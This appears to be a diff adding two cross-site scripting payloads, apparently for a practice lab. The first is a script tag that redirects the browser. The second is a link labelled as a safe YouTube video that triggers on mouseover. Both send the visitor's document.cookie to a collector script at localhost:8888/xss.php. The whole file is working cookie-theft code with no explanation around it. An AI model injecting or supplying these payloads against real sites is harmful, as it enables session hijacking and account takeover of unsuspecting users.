@@ -1,0 +1,8 @@
+
+// Redirect
+<script>window.location='http://localhost:8888/xss.php?cookie='+escape(document.cookie)</script>
+
+// Hover
+Check out this very safe video:<a href="https://www.youtube.com/" onmouseover="window.location='http://localhost:8888/xss.php?cookie='+escape(document.cookie)">
+https://www.youtube.com/
+</a>
